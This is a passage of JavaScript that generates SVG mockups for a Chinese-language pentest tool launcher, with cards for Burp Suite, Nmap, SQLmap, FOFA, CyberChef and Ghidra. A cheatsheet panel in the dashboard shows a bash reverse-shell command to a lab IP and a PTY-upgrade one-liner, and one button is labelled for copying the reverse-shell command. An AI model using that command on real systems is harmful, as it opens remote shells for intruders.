      <text x="56" y="27" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">SQLmap Automation</text>
      <rect x="56" y="32" width="52" height="16" rx="4" fill="#A855F7" fill-opacity="0.15"/>
      <text x="82" y="44" text-anchor="middle" class="font-mono" font-size="9" font-weight="700" fill="#C084FC">SCRIPT</text>
      <text x="296" y="28" font-size="14" fill="#F59E0B">★</text>
      <text x="14" y="66" class="font-sans" font-size="11" fill="#94A3B8">自动化 SQL 注入点检测与数据库接管渗透套件</text>
      <g transform="translate(14, 76)">
        <rect x="0" y="0" width="52" height="18" rx="4" fill="#1E293B"/>
        <text x="26" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#C084FC">#SQLi</text>
        <rect x="58" y="0" width="62" height="18" rx="4" fill="#1E293B"/>
        <text x="89" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#C084FC">#Python</text>
      </g>
      <line x1="0" y1="100" x2="318" y2="100" stroke="#1E293B" stroke-width="1"/>
      <text x="14" y="119" class="font-mono" font-size="10" fill="#64748B">python sqlmap.py</text>
      <rect x="226" y="105" width="80" height="22" rx="4" fill="url(#emeraldGradient)"/>
      <text x="266" y="120" text-anchor="middle" class="font-sans" font-size="11" font-weight="600" fill="#FFFFFF">&gt;_ 命令行</text>
    </g>

    <!-- Card 6: FOFA Pro -->
    <g transform="translate(674, 158)">
      <rect x="0" y="0" width="318" height="132" rx="8" fill="url(#cardBgGradient)" stroke="#334155" stroke-width="1" filter="url(#cardShadow)"/>
      <rect x="14" y="14" width="32" height="32" rx="6" fill="#0EA5E9" fill-opacity="0.2"/>
      <text x="30" y="35" text-anchor="middle" class="font-sans" font-size="14" font-weight="800" fill="#38BDF8">F</text>
      <text x="56" y="27" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">FOFA 空间测绘</text>
      <rect x="56" y="32" width="76" height="16" rx="4" fill="#0EA5E9" fill-opacity="0.15"/>
      <text x="94" y="44" text-anchor="middle" class="font-mono" font-size="9" font-weight="700" fill="#38BDF8">WEB ONLINE</text>
      <text x="296" y="28" font-size="14" fill="#F59E0B">★</text>
      <text x="14" y="66" class="font-sans" font-size="11" fill="#94A3B8">网络资产搜索引擎、指纹快速匹配与拓扑分析</text>
      <g transform="translate(14, 76)">
        <rect x="0" y="0" width="52" height="18" rx="4" fill="#1E293B"/>
        <text x="26" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#38BDF8">#OSINT</text>
        <rect x="58" y="0" width="52" height="18" rx="4" fill="#1E293B"/>
        <text x="84" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#38BDF8">#Asset</text>
      </g>
      <line x1="0" y1="100" x2="318" y2="100" stroke="#1E293B" stroke-width="1"/>
      <text x="14" y="119" class="font-mono" font-size="10" fill="#64748B">https://fofa.info</text>
      <rect x="226" y="105" width="80" height="22" rx="4" fill="url(#cyanGradient)"/>
      <text x="266" y="120" text-anchor="middle" class="font-sans" font-size="11" font-weight="600" fill="#FFFFFF">↗ 打开网页</text>
    </g>
  </g>

  <!-- Section 3: Bottom 2-Col (Recent Runs + Cheatsheet) -->
  <g transform="translate(264, 526)">
    <!-- Left Col: Recent Activity (485px) -->
    <g transform="translate(0, 0)">
      <rect x="0" y="0" width="485" height="248" rx="8" fill="#111827" stroke="#1E293B" stroke-width="1"/>
      <!-- Header -->
      <path d="M12 8v4l3 3m6-3a9 9 0 1 1-18 0 9 9 0 0 1 18 0z" transform="translate(14, 12) scale(0.8)" fill="none" stroke="#38BDF8" stroke-width="1.8"/>
      <text x="36" y="25" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">最近运行历史 (RECENT RUNS)</text>
      <text x="465" y="25" text-anchor="end" class="font-sans" font-size="11" fill="#64748B">自动清理</text>
      <line x1="0" y1="38" x2="485" y2="38" stroke="#1E293B" stroke-width="1"/>

      <!-- Item 1 -->
      <g transform="translate(14, 48)">
        <rect x="0" y="0" width="457" height="54" rx="6" fill="#162032"/>
        <circle cx="16" cy="27" r="4" fill="#10B981"/>
        <text x="30" y="24" class="font-sans" font-size="12" font-weight="700" fill="#F8FAFC">Burp Suite Pro</text>
        <text x="130" y="24" class="font-mono" font-size="10" fill="#64748B">12分钟前启动 · PID: 8924</text>
        <text x="30" y="42" class="font-mono" font-size="10" fill="#94A3B8">参数: -Xmx4096m -XX:+UseG1GC</text>
        <rect x="385" y="14" width="60" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <text x="415" y="30" text-anchor="middle" class="font-sans" font-size="10" fill="#38BDF8">再次启动</text>
      </g>

      <!-- Item 2 -->
      <g transform="translate(14, 110)">
        <rect x="0" y="0" width="457" height="54" rx="6" fill="#162032"/>
        <circle cx="16" cy="27" r="4" fill="#38BDF8"/>
        <text x="30" y="24" class="font-sans" font-size="12" font-weight="700" fill="#F8FAFC">Nmap Scanner</text>
        <text x="125" y="24" class="font-mono" font-size="10" fill="#64748B">1小时前 · 耗时 42s</text>
        <text x="30" y="42" class="font-mono" font-size="10" fill="#94A3B8">参数: -sC -sV -T4 -p 1-10000 10.10.11.23</text>
        <rect x="385" y="14" width="60" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <text x="415" y="30" text-anchor="middle" class="font-sans" font-size="10" fill="#94A3B8">查看日志</text>
      </g>

      <!-- Item 3 -->
      <g transform="translate(14, 172)">
        <rect x="0" y="0" width="457" height="54" rx="6" fill="#162032"/>
        <circle cx="16" cy="27" r="4" fill="#A855F7"/>
        <text x="30" y="24" class="font-sans" font-size="12" font-weight="700" fill="#F8FAFC">CyberChef Online</text>
        <text x="145" y="24" class="font-mono" font-size="10" fill="#64748B">今天 14:20 · 浏览器唤起</text>
        <text x="30" y="42" class="font-mono" font-size="10" fill="#94A3B8">链接: https://gchq.github.io/CyberChef/</text>
        <rect x="385" y="14" width="60" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <text x="415" y="30" text-anchor="middle" class="font-sans" font-size="10" fill="#94A3B8">再次访问</text>
      </g>
    </g>

    <!-- Right Col: Security Cheatsheet (485px) -->
    <g transform="translate(507, 0)">
      <rect x="0" y="0" width="485" height="248" rx="8" fill="#111827" stroke="#1E293B" stroke-width="1"/>
      <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z M14 2v6h6" transform="translate(14, 12) scale(0.8)" fill="none" stroke="#F59E0B" stroke-width="1.8"/>
      <text x="36" y="25" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">安全指令速查备忘 (SCRATCHPAD)</text>
      <!-- Cheatsheet Tabs -->
      <g transform="translate(230, 8)">
        <rect x="0" y="0" width="76" height="22" rx="4" fill="#1E293B" stroke="#F59E0B" stroke-width="0.8"/>
        <text x="38" y="15" text-anchor="middle" class="font-sans" font-size="10" fill="#FBBF24">反弹Shell</text>
        <rect x="82" y="0" width="76" height="22" rx="4" fill="#0B0F17"/>
        <text x="120" y="15" text-anchor="middle" class="font-sans" font-size="10" fill="#94A3B8">Nmap速查</text>
        <rect x="164" y="0" width="80" height="22" rx="4" fill="#0B0F17"/>
        <text x="204" y="15" text-anchor="middle" class="font-sans" font-size="10" fill="#94A3B8">Sqlmap参数</text>
      </g>
      <line x1="0" y1="38" x2="485" y2="38" stroke="#1E293B" stroke-width="1"/>

      <!-- Code Snippet Area -->
      <g transform="translate(14, 48)">
        <rect x="0" y="0" width="457" height="142" rx="6" fill="#090D14" stroke="#1E293B" stroke-width="1"/>
        <text x="14" y="24" class="font-mono" font-size="11" fill="#64748B"># 1. 经典 Bash 交互反弹 Shell</text>
        <text x="14" y="44" class="font-mono" font-size="11" fill="#38BDF8">bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1</text>
        <text x="14" y="74" class="font-mono" font-size="11" fill="#64748B"># 2. Python3 升级 PTY 完整 TTY 交互终端</text>
        <text x="14" y="94" class="font-mono" font-size="11" fill="#34D399">python3 -c 'import pty; pty.spawn("/bin/bash")'</text>
        <text x="14" y="124" class="font-mono" font-size="11" fill="#64748B"># 3. 目标端一键重置 stty raw -echo; fg</text>
      </g>
      <!-- Copy Button -->
      <g transform="translate(14, 202)">
        <rect x="0" y="0" width="457" height="32" rx="6" fill="#1E293B" stroke="#334155" stroke-width="1"/>
        <path d="M8 4v12a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2V7.242a2 2 0 0 0-.602-1.43L16.083 2.57A2 2 0 0 0 14.685 2H10a2 2 0 0 0-2 2z" transform="translate(170, 7) scale(0.8)" fill="none" stroke="#38BDF8" stroke-width="1.8"/>
        <text x="240" y="20" text-anchor="middle" class="font-sans" font-size="11" font-weight="600" fill="#38BDF8">复制当前选中的反弹命令至剪贴板</text>
      </g>
    </g>
  </g>
  ${renderStatusBar('dashboard')}
</svg>`;
}
console.log('Dashboard SVG generator compiled.');

function generateAllToolsSvg() {
  return `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 800" width="1280" height="800">
  ${SVG_DEFS}
  <!-- Window Base Canvas -->
  <rect width="1280" height="800" rx="10" fill="#0B0F17" stroke="#1E293B" stroke-width="1.5"/>

  ${renderWindowHeader()}
  ${renderSidebar('all_tools')}

  <!-- Main Content Area: All Tools (1040 x 760) -->
  <!-- Top Control Bar (Search + Dropdowns + View Mode + Add) -->
  <g transform="translate(264, 52)">
    <!-- Search Input -->
    <rect x="0" y="0" width="370" height="38" rx="6" fill="#131B2B" stroke="#334155" stroke-width="1"/>
    <path d="M12 9A4 4 0 1 0 4 9a4 4 0 0 0 8 0zm-1 3l3.5 3.5" transform="translate(12, 10)" fill="none" stroke="#64748B" stroke-width="1.5" stroke-linecap="round"/>
    <text x="38" y="24" class="font-sans" font-size="12" fill="#64748B">搜索工具名称、标签、路径、备忘... (支持模糊匹配)</text>

    <!-- Category Dropdown -->
    <g transform="translate(382, 0)">
      <rect x="0" y="0" width="150" height="38" rx="6" fill="#1E293B" stroke="#334155" stroke-width="1"/>
      <circle cx="16" cy="19" r="4" fill="#0EA5E9"/>
      <text x="28" y="24" class="font-sans" font-size="13.5" font-weight="500" fill="#E2E8F0">全部分类 (8)</text>
      <path d="M6 9l6 6 6-6" transform="translate(122, 14) scale(0.6)" fill="none" stroke="#94A3B8" stroke-width="2" stroke-linecap="round"/>
    </g>

    <!-- View Toggle (Grid / List) -->
    <g transform="translate(544, 0)">
      <rect x="0" y="0" width="76" height="38" rx="6" fill="#1E293B" stroke="#334155" stroke-width="1"/>
      <!-- Grid Active -->
      <rect x="2" y="2" width="36" height="34" rx="4" fill="#0EA5E9" fill-opacity="0.2"/>
      <path d="M3 3h4v4H3zm6 0h4v4H9zm-6 6h4v4H3zm6 0h4v4H9z" transform="translate(12, 11) scale(1.1)" fill="none" stroke="#38BDF8" stroke-width="1.8"/>
      <!-- List Inactive -->
      <path d="M3 6h10M3 10h10M3 14h10" transform="translate(50, 11) scale(1.1)" fill="none" stroke="#64748B" stroke-width="1.8" stroke-linecap="round"/>
    </g>

    <!-- Sort Dropdown -->
    <g transform="translate(632, 0)">
      <rect x="0" y="0" width="140" height="38" rx="6" fill="#1E293B" stroke="#334155" stroke-width="1"/>
      <path d="M7 3v12m0 0l-3-3m3 3l3-3m7 3V3m0 0l-3 3m3-3l3 3" transform="translate(12, 10) scale(0.9)" fill="none" stroke="#94A3B8" stroke-width="1.6" stroke-linecap="round"/>
      <text x="32" y="24" class="font-sans" font-size="13.5" font-weight="500" fill="#E2E8F0">排序: 自定义 ⇅</text>
    </g>

    <!-- Primary Add Button -->
    <g transform="translate(784, 0)">
      <rect x="0" y="0" width="120" height="38" rx="6" fill="url(#cyanGradient)" filter="url(#cardShadow)"/>
      <path d="M12 5v14m-7-7h14" transform="translate(14, 9) scale(0.9)" fill="none" stroke="#FFFFFF" stroke-width="2" stroke-linecap="round"/>
      <text x="38" y="24" class="font-sans" font-size="12" font-weight="600" fill="#FFFFFF">新建工具</text>
    </g>
  </g>

  <!-- Filter Pills Bar (Type Chips + Tags) -->
  <g transform="translate(264, 104)">
    <!-- Type Filter Tabs -->
    <g transform="translate(0, 0)">
      <rect x="0" y="0" width="84" height="28" rx="6" fill="#0EA5E9" fill-opacity="0.15" stroke="#0EA5E9" stroke-width="1"/>
      <text x="42" y="18" text-anchor="middle" class="font-sans" font-size="11" font-weight="700" fill="#38BDF8">全部 (48)</text>

      <rect x="92" y="0" width="105" height="28" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
      <circle cx="106" cy="14" r="3.5" fill="#10B981"/>
      <text x="146" y="18" text-anchor="middle" class="font-sans" font-size="11" fill="#94A3B8">本地程序 (22)</text>

      <rect x="205" y="0" width="105" height="28" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
      <circle cx="219" cy="14" r="3.5" fill="#0EA5E9"/>
      <text x="259" y="18" text-anchor="middle" class="font-sans" font-size="11" fill="#94A3B8">在线网页 (12)</text>

      <rect x="318" y="0" width="105" height="28" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
      <circle cx="332" cy="14" r="3.5" fill="#A855F7"/>
      <text x="372" y="18" text-anchor="middle" class="font-sans" font-size="11" fill="#94A3B8">自动化脚本 (14)</text>
    </g>

    <!-- Tag Pills (Right aligned) -->
    <g transform="translate(470, 2)">
      <text x="0" y="18" class="font-sans" font-size="11" fill="#64748B">快速标签过滤:</text>
      <rect x="80" y="0" width="56" height="24" rx="4" fill="#1E293B"/>
      <text x="108" y="16" text-anchor="middle" class="font-mono" font-size="10" fill="#CBD5E1">#Web</text>
      <rect x="142" y="0" width="64" height="24" rx="4" fill="#1E293B"/>
      <text x="174" y="16" text-anchor="middle" class="font-mono" font-size="10" fill="#CBD5E1">#Recon</text>
      <rect x="212" y="0" width="70" height="24" rx="4" fill="#1E293B"/>
      <text x="247" y="16" text-anchor="middle" class="font-mono" font-size="10" fill="#CBD5E1">#Python3</text>
      <rect x="288" y="0" width="56" height="24" rx="4" fill="#1E293B"/>
      <text x="316" y="16" text-anchor="middle" class="font-mono" font-size="10" fill="#CBD5E1">#GUI</text>
      <rect x="350" y="0" width="52" height="24" rx="4" fill="#1E293B"/>
      <text x="376" y="16" text-anchor="middle" class="font-mono" font-size="10" fill="#CBD5E1">#CLI</text>
      <rect x="408" y="0" width="56" height="24" rx="4" fill="#1E293B"/>
      <text x="436" y="16" text-anchor="middle" class="font-mono" font-size="10" fill="#CBD5E1">#PoC</text>
    </g>
  </g>

  <!-- Main Grid Area: 6 Rich Cards (3 Cols x 2 Rows) -->
  <g transform="translate(264, 146)">
    <!-- CARD 1: Burp Suite Pro (Row 1, Col 1) -->
    <g transform="translate(0, 0)">
      <rect x="0" y="0" width="318" height="175" rx="8" fill="url(#cardBgGradient)" stroke="#0EA5E9" stroke-width="1.2" stroke-opacity="0.8" filter="url(#cardShadow)"/>
      <!-- Drag Handle -->
      <path d="M4 8h16M4 12h16" transform="translate(8, 6) scale(0.6)" stroke="#475569" stroke-width="2"/>
      <!-- Icon + Title + Badge -->
      <rect x="14" y="18" width="36" height="36" rx="6" fill="#F97316" fill-opacity="0.2"/>
      <text x="32" y="42" text-anchor="middle" class="font-sans" font-size="18" font-weight="800" fill="#FB923C">B</text>
      <text x="58" y="32" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">Burp Suite Pro</text>
      <rect x="58" y="38" width="70" height="16" rx="4" fill="#10B981" fill-opacity="0.15"/>
      <text x="93" y="50" text-anchor="middle" class="font-mono" font-size="9" font-weight="700" fill="#34D399">LOCAL GUI</text>
      <!-- Star Icon (Favorited) -->
      <text x="294" y="34" font-size="16" fill="#F59E0B">★</text>
      <!-- Description -->
      <text x="14" y="76" class="font-sans" font-size="11" fill="#94A3B8">Web 安全测试、中间人代理与自动化漏洞扫描</text>
      <!-- Tags -->
      <g transform="translate(14, 88)">
        <rect x="0" y="0" width="46" height="18" rx="4" fill="#1E293B"/>
        <text x="23" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#38BDF8">#Web</text>
        <rect x="52" y="0" width="54" height="18" rx="4" fill="#1E293B"/>
        <text x="79" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#38BDF8">#Proxy</text>
        <rect x="112" y="0" width="50" height="18" rx="4" fill="#1E293B"/>
        <text x="137" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#38BDF8">#Java</text>
      </g>
      <!-- Target Path & Launch Footer -->
      <line x1="0" y1="122" x2="318" y2="122" stroke="#1E293B" stroke-width="1"/>
      <text x="14" y="142" class="font-mono" font-size="10" fill="#64748B">D:\\SecTools\\BurpSuitePro.exe</text>
      <!-- Footer Buttons -->
      <g transform="translate(14, 146)">
        <rect x="0" y="0" width="130" height="24" rx="4" fill="url(#emeraldGradient)"/>
        <text x="65" y="16" text-anchor="middle" class="font-sans" font-size="11" font-weight="600" fill="#FFFFFF">▶ 启动应用程序</text>
        <!-- Copy Button -->
        <rect x="140" y="0" width="28" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <path d="M8 4v12a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2V7.242a2 2 0 0 0-.602-1.43L16.083 2.57A2 2 0 0 0 14.685 2H10a2 2 0 0 0-2 2z" transform="translate(144, 4) scale(0.65)" fill="none" stroke="#94A3B8" stroke-width="1.5"/>
        <!-- Edit Button -->
        <rect x="176" y="0" width="28" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <path d="M12 20h9M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z" transform="translate(180, 4) scale(0.65)" fill="none" stroke="#94A3B8" stroke-width="1.5"/>
        <!-- More Menu -->
        <rect x="212" y="0" width="76" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <text x="250" y="16" text-anchor="middle" class="font-mono" font-size="10" fill="#94A3B8">··· 菜单</text>
      </g>
    </g>

    <!-- CARD 2: Nmap Scanner (Row 1, Col 2) -->
    <g transform="translate(337, 0)">
      <rect x="0" y="0" width="318" height="175" rx="8" fill="url(#cardBgGradient)" stroke="#334155" stroke-width="1" filter="url(#cardShadow)"/>
      <path d="M4 8h16M4 12h16" transform="translate(8, 6) scale(0.6)" stroke="#475569" stroke-width="2"/>
      <rect x="14" y="18" width="36" height="36" rx="6" fill="#10B981" fill-opacity="0.2"/>
      <text x="32" y="42" text-anchor="middle" class="font-sans" font-size="18" font-weight="800" fill="#34D399">N</text>
      <text x="58" y="32" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">Nmap Network Scanner</text>
      <rect x="58" y="38" width="68" height="16" rx="4" fill="#10B981" fill-opacity="0.15"/>
      <text x="92" y="50" text-anchor="middle" class="font-mono" font-size="9" font-weight="700" fill="#34D399">LOCAL CLI</text>
      <text x="294" y="34" font-size="16" fill="#F59E0B">★</text>
      <text x="14" y="76" class="font-sans" font-size="11" fill="#94A3B8">网络资产发现、端口指纹扫描与脆弱性探测</text>
      <g transform="translate(14, 88)">
        <rect x="0" y="0" width="52" height="18" rx="4" fill="#1E293B"/>
        <text x="26" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#34D399">#Recon</text>
        <rect x="58" y="0" width="66" height="18" rx="4" fill="#1E293B"/>
        <text x="91" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#34D399">#PortScan</text>
      </g>
      <line x1="0" y1="122" x2="318" y2="122" stroke="#1E293B" stroke-width="1"/>
      <text x="14" y="142" class="font-mono" font-size="10" fill="#64748B">C:\\Program Files\\Nmap\\nmap.exe</text>
      <g transform="translate(14, 146)">
        <rect x="0" y="0" width="130" height="24" rx="4" fill="url(#emeraldGradient)"/>
        <text x="65" y="16" text-anchor="middle" class="font-sans" font-size="11" font-weight="600" fill="#FFFFFF">&gt;_ 命令行运行</text>
        <rect x="140" y="0" width="28" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <path d="M8 4v12a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2V7.242a2 2 0 0 0-.602-1.43L16.083 2.57A2 2 0 0 0 14.685 2H10a2 2 0 0 0-2 2z" transform="translate(144, 4) scale(0.65)" fill="none" stroke="#94A3B8" stroke-width="1.5"/>
        <rect x="176" y="0" width="28" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <path d="M12 20h9M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z" transform="translate(180, 4) scale(0.65)" fill="none" stroke="#94A3B8" stroke-width="1.5"/>
        <rect x="212" y="0" width="76" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <text x="250" y="16" text-anchor="middle" class="font-mono" font-size="10" fill="#94A3B8">··· 菜单</text>
      </g>
    </g>

    <!-- CARD 3: SQLmap Automation (Row 1, Col 3) -->
    <g transform="translate(674, 0)">
      <rect x="0" y="0" width="318" height="175" rx="8" fill="url(#cardBgGradient)" stroke="#334155" stroke-width="1" filter="url(#cardShadow)"/>
      <path d="M4 8h16M4 12h16" transform="translate(8, 6) scale(0.6)" stroke="#475569" stroke-width="2"/>
      <rect x="14" y="18" width="36" height="36" rx="6" fill="#A855F7" fill-opacity="0.2"/>
      <text x="32" y="42" text-anchor="middle" class="font-sans" font-size="18" font-weight="800" fill="#C084FC">S</text>
      <text x="58" y="32" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">SQLmap Automation</text>
      <rect x="58" y="38" width="52" height="16" rx="4" fill="#A855F7" fill-opacity="0.15"/>
      <text x="84" y="50" text-anchor="middle" class="font-mono" font-size="9" font-weight="700" fill="#C084FC">SCRIPT</text>
      <text x="294" y="34" font-size="16" fill="#F59E0B">★</text>
      <text x="14" y="76" class="font-sans" font-size="11" fill="#94A3B8">自动化 SQL 注入检测与数据库接管渗透套件</text>
      <g transform="translate(14, 88)">
        <rect x="0" y="0" width="52" height="18" rx="4" fill="#1E293B"/>
        <text x="26" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#C084FC">#SQLi</text>
        <rect x="58" y="0" width="62" height="18" rx="4" fill="#1E293B"/>
        <text x="89" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#C084FC">#Python</text>
      </g>
      <line x1="0" y1="122" x2="318" y2="122" stroke="#1E293B" stroke-width="1"/>
      <text x="14" y="142" class="font-mono" font-size="10" fill="#64748B">D:\\SecTools\\sqlmap\\sqlmap.py</text>
      <g transform="translate(14, 146)">
        <rect x="0" y="0" width="130" height="24" rx="4" fill="url(#emeraldGradient)"/>
        <text x="65" y="16" text-anchor="middle" class="font-sans" font-size="11" font-weight="600" fill="#FFFFFF">&gt;_ 终端运行</text>
        <rect x="140" y="0" width="28" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <path d="M8 4v12a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2V7.242a2 2 0 0 0-.602-1.43L16.083 2.57A2 2 0 0 0 14.685 2H10a2 2 0 0 0-2 2z" transform="translate(144, 4) scale(0.65)" fill="none" stroke="#94A3B8" stroke-width="1.5"/>
        <rect x="176" y="0" width="28" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <path d="M12 20h9M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z" transform="translate(180, 4) scale(0.65)" fill="none" stroke="#94A3B8" stroke-width="1.5"/>
        <rect x="212" y="0" width="76" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <text x="250" y="16" text-anchor="middle" class="font-mono" font-size="10" fill="#94A3B8">··· 菜单</text>
      </g>
    </g>

    <!-- CARD 4: CyberChef (Row 2, Col 1) -->
    <g transform="translate(0, 192)">
      <rect x="0" y="0" width="318" height="175" rx="8" fill="url(#cardBgGradient)" stroke="#334155" stroke-width="1" filter="url(#cardShadow)"/>
      <path d="M4 8h16M4 12h16" transform="translate(8, 6) scale(0.6)" stroke="#475569" stroke-width="2"/>
      <rect x="14" y="18" width="36" height="36" rx="6" fill="#0EA5E9" fill-opacity="0.2"/>
      <text x="32" y="42" text-anchor="middle" class="font-sans" font-size="18" font-weight="800" fill="#38BDF8">C</text>
      <text x="58" y="32" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">CyberChef Online</text>
      <rect x="58" y="38" width="76" height="16" rx="4" fill="#0EA5E9" fill-opacity="0.15"/>
      <text x="96" y="50" text-anchor="middle" class="font-mono" font-size="9" font-weight="700" fill="#38BDF8">WEB ONLINE</text>
      <text x="294" y="34" font-size="16" fill="#F59E0B">★</text>
      <text x="14" y="76" class="font-sans" font-size="11" fill="#94A3B8">网络从业者多功能编码解码与格式转换军刀</text>
      <g transform="translate(14, 88)">
        <rect x="0" y="0" width="58" height="18" rx="4" fill="#1E293B"/>
        <text x="29" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#38BDF8">#Crypto</text>
        <rect x="64" y="0" width="58" height="18" rx="4" fill="#1E293B"/>
        <text x="93" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#38BDF8">#Decode</text>
      </g>
      <line x1="0" y1="122" x2="318" y2="122" stroke="#1E293B" stroke-width="1"/>
      <text x="14" y="142" class="font-mono" font-size="10" fill="#64748B">https://gchq.github.io/CyberChef/</text>
      <g transform="translate(14, 146)">
        <rect x="0" y="0" width="130" height="24" rx="4" fill="url(#cyanGradient)"/>
        <text x="65" y="16" text-anchor="middle" class="font-sans" font-size="11" font-weight="600" fill="#FFFFFF">↗ 打开网页端</text>
        <rect x="140" y="0" width="28" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <path d="M8 4v12a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2V7.242a2 2 0 0 0-.602-1.43L16.083 2.57A2 2 0 0 0 14.685 2H10a2 2 0 0 0-2 2z" transform="translate(144, 4) scale(0.65)" fill="none" stroke="#94A3B8" stroke-width="1.5"/>
        <rect x="176" y="0" width="28" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <path d="M12 20h9M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z" transform="translate(180, 4) scale(0.65)" fill="none" stroke="#94A3B8" stroke-width="1.5"/>
        <rect x="212" y="0" width="76" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <text x="250" y="16" text-anchor="middle" class="font-mono" font-size="10" fill="#94A3B8">··· 菜单</text>
      </g>
    </g>

    <!-- CARD 5: Ghidra Decompiler (Row 2, Col 2) -->
    <g transform="translate(337, 192)">
      <rect x="0" y="0" width="318" height="175" rx="8" fill="url(#cardBgGradient)" stroke="#334155" stroke-width="1" filter="url(#cardShadow)"/>
      <path d="M4 8h16M4 12h16" transform="translate(8, 6) scale(0.6)" stroke="#475569" stroke-width="2"/>
      <rect x="14" y="18" width="36" height="36" rx="6" fill="#EF4444" fill-opacity="0.2"/>
      <text x="32" y="42" text-anchor="middle" class="font-sans" font-size="18" font-weight="800" fill="#F87171">G</text>
      <text x="58" y="32" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">Ghidra 逆向套件</text>
      <rect x="58" y="38" width="70" height="16" rx="4" fill="#10B981" fill-opacity="0.15"/>
      <text x="93" y="50" text-anchor="middle" class="font-mono" font-size="9" font-weight="700" fill="#34D399">LOCAL GUI</text>
      <text x="294" y="34" font-size="16" fill="#475569">☆</text>
      <text x="14" y="76" class="font-sans" font-size="11" fill="#94A3B8">NSA 开源软件逆向分析套件与反编译框架</text>
      <g transform="translate(14, 88)">
        <rect x="0" y="0" width="60" height="18" rx="4" fill="#1E293B"/>
        <text x="30" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#F87171">#Reverse</text>
        <rect x="66" y="0" width="48" height="18" rx="4" fill="#1E293B"/>
        <text x="90" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#F87171">#NSA</text>
      </g>
      <line x1="0" y1="122" x2="318" y2="122" stroke="#1E293B" stroke-width="1"/>
      <text x="14" y="142" class="font-mono" font-size="10" fill="#64748B">D:\\SecTools\\Ghidra\\ghidraRun.bat</text>
      <g transform="translate(14, 146)">
        <rect x="0" y="0" width="130" height="24" rx="4" fill="url(#emeraldGradient)"/>
        <text x="65" y="16" text-anchor="middle" class="font-sans" font-size="11" font-weight="600" fill="#FFFFFF">▶ 启动应用程序</text>
        <rect x="140" y="0" width="28" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <path d="M8 4v12a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2V7.242a2 2 0 0 0-.602-1.43L16.083 2.57A2 2 0 0 0 14.685 2H10a2 2 0 0 0-2 2z" transform="translate(144, 4) scale(0.65)" fill="none" stroke="#94A3B8" stroke-width="1.5"/>
        <rect x="176" y="0" width="28" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <path d="M12 20h9M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z" transform="translate(180, 4) scale(0.65)" fill="none" stroke="#94A3B8" stroke-width="1.5"/>
        <rect x="212" y="0" width="76" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <text x="250" y="16" text-anchor="middle" class="font-mono" font-size="10" fill="#94A3B8">··· 菜单</text>
      </g>
    </g>

    <!-- CARD 6: Dirsearch (Row 2, Col 3) -->
    <g transform="translate(674, 192)">
      <rect x="0" y="0" width="318" height="175" rx="8" fill="url(#cardBgGradient)" stroke="#334155" stroke-width="1" filter="url(#cardShadow)"/>
